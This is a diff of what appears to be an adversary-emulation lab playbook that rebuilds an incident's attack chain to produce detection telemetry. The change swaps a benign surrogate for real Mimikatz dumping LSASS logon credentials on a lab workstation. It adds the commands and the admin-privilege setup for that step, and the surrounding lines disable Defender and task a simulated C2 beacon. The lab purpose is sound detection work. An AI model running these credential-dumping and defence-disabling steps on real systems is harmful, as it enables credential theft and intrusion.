@@ -16,6 +16,7 @@ credentials only via prompt/runas — never on a command line or in logs.
 | Repo HEAD | `git pull` and confirm `git log -1` matches the reviewed commit | — |
 | wmic on WS01 | `where wmic` (absent on 24H2+ → use CIM fallback, record `PARTIAL`) | M-1 |
 | `it.admin` local admin on FS01 | `runas /user:C0015\it.admin "cmd /c whoami /groups"` (needs admin on target for WMI Create) | M-1 |
+| it.admin local admin on **WS01** (SeDebugPrivilege for S7b) | same `runas ... whoami /groups` on WS01 → add to local Administrators if missing ([LAB CONFIG]) | M-1 |
 | Sysmon BALANCED on WS01+FS01 | `& C:\Tools\sysmon64.exe -c C:\Tools\sysmon-c0015-balanced.xml` (E7 scope includes `C:\C0015\`) | M-1 |
 | Defender off (lab config) | `Set-MpPreference -DisableRealtimeMonitoring $true` (+ observe 5001/1151) | — |
 | Audit | 4624/4625/4648/4672/4688 success+failure; S4688 with process command line | M-1 |
@@ -25,7 +26,7 @@ credentials only via prompt/runas — never on a command line or in logs.
 |---|---|---|
 | Session-1 chain (S1–S3 re-run) | `payloads/hta/bootstrap.hta`, `payloads/beacon/c0015_beacon.ps1`, `payloads/dll/c0015_bootstrap_dll.c`, `payloads/docm/macro_payload.vba` | `payloads/packaging/build_dll.sh` → `build/out/c0015-comparefor.jpg`; `make_config.ps1` (full task map) |
 | **143.dll surrogate (S8/S9)** — NEW | `payloads/dll/c0015_143_surrogate.c` | `x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi` (on Kali) |
-| Mimikatz-shaped LSASS surrogate (**S7b**, NEW) | `payloads/lsass/c0015_mimikatz_surrogate.c` | `x86_64-w64-mingw32-gcc -O2 -o mimikatz.exe payloads/lsass/c0015_mimikatz_surrogate.c -luser32` (Kali) → stage `C:\Tools\mimikatz.exe` on WS01 |
+| Mimikatz-shaped LSASS surrogate (**fallback for S7b**) | `payloads/lsass/c0015_mimikatz_surrogate.c` | only if real Mimikatz deployment is blocked: `x86_64-w64-mingw32-gcc -O2 -o mimikatz.exe payloads/lsass/c0015_mimikatz_surrogate.c -luser32` (Kali) → `C:\Tools\mimikatz.exe` on WS01 |
 | phase7 config (FS01) | `payloads/config/c0015-phase7.example.ini` → fill `run_id` | staged to `C:\C0015\config-phase7.ini` in S8a |
 | C2-SIM v3 | `scripts/c2sim_v2.py` — dynamic tasking via `POST /cmd` (operator benign commands; queue priority) + phase3 batch + phase7-session2 receipt | `python scripts/c2sim_v2.py --ip 192.168.50.1 --port 8080 --ledger evidence/run-ledger --log c2sim.log` |
 
@@ -126,24 +127,39 @@ Elastic: WS01 S4648 (explicit credential); FS01 S4624 T3 + S4672 joined by **FS0
 LogonId); S4625 for A/C. Note: the IPC$ session does **not** change the process token — S8b must re-supply the
 credential explicitly.
 
-## 5b. S7b — credential-access simulation (LSASS, Mimikatz-shaped surrogate)
+## 5b. S7b — credential access (REAL Mimikatz on WS01 lsass; operator-driven)
 
-Payload: `payloads/lsass/c0015_mimikatz_surrogate.c` → `mimikatz.exe` staged to `C:\Tools\mimikatz.exe` on
-WS01 (masquerade name = enrichment only). Tasked through the beacon (single `/cmd` or the v3.1 runbook entry):
+Payload: **real Mimikatz** from [ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz) — clone on the attacker
+host, verify the binary before deployment, copy `x64\mimikatz.exe` → `C:\Tools\mimikatz.exe` on WS01.
+(Our `payloads/lsass/c0015_mimikatz_surrogate.c` remains a **fallback** when deployment of the real tool is blocked.)
+
+Preconditions (preflight gates):
+- **`it.admin` ∈ local Administrators on WS01** (SeDebugPrivilege) — without it, opening lsass fails (real negative
+  telemetry, but the chain needs the grant). Verify `runas /user:C0015\it.admin "cmd /c whoami /groups"`.
+- **LSASS data exists on WS01**: an it.admin logon session must be anchored on WS01 first — S7 already creates it
+  (`net use \\FS01\IPC$ /user:it.admin` = network logon on WS01). Optional richer session:
+  `runas /user:C0015\it.admin "cmd /c whoami"` (type-8 logon).
+
+> **Why is it.admin in WS01's lsass?** A credential only lives in the lsass of the machine where that logon
+> OCCURRED. Authenticating as it.admin FROM WS01 (net use / runas) anchors it.admin's material (Kerberos/NTLM) in
+> WS01's lsass — it can never appear there "by itself". DFIR attributes the harvest to Process Hacker/LSASS
+> (`[INFERRED-C0015]`, provenance `[UNKNOWN-C0015]`); the lab reproduces the same mechanism self-consistently:
+> **S7 plants the session → S7b harvests it → S8 uses the identity**.
+
+Run (password at the runas prompt only, never on the command line / logs):
 ```powershell
-Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "C:\Tools\mimikatz.exe sekurlsa::logonpasswords /out:C:\C0015\lsass.dmp"
+runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
 ```
-What it does (LAB SURROGATE — **no credential material is read or stored**):
-- E1 with `Image = mimikatz.exe` + `sekurlsa::logonpasswords` command line (parent = beacon powershell)
-- **E10 ProcessAccess**: `OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)` on `lsass.exe` → real
-  high-access-mask telemetry (BALANCED profile includes `lsass.exe` targets)
-- E11: decoy `C:\C0015\lsass.dmp` (benign bytes)
+Guardrails (lab boundary, recorded in `docs/attack-chain-plan.md` §10):
+- The dump/console output **stays on the VM**: no `lsass.dmp`/output file written to disk, nothing copied into the
+  repo, ledger, logs or this playbook; close the window after the run.
+- The WMI identity at S8 remains the operator-provided prompt (the lab's own provisioned password) — the harvested
+  values are never consumed or stored outside the run.
 
-Evidence: WS01 E10 (target `lsass.exe`, GrantedAccess ≈ `0x1FFFFF`, source = beacon child) + E11 + banner result in
-`c2sim.log`. This generates the plausibility telemetry DFIR attributes to Process Hacker/LSASS
-(`[INFERRED-C0015]`; provenance `[UNKNOWN-C0015]` stays recorded) — the actual WMI identity at S8 is STILL the
-operator prompt; the simulation harvests nothing.
-Rollback: delete `C:\Tools\mimikatz.exe` + `C:\C0015\lsass.dmp`.
+Evidence: WS01 **S4648** (explicit credential), **E1 `mimikatz.exe`** (parent = `cmd.exe` via runas),
+**E10 ProcessAccess target `lsass.exe`** (real high GrantedAccess from the elevated token), output in the runas
+console only. `c2sim.log` contains NO mimikatz line (operator-driven, outside the beacon).
+Rollback: delete `C:\Tools\mimikatz.exe`.
 
 ## 6. S8a — tool handoff (T1570 surrogate; WS01 → FS01 C$)
 
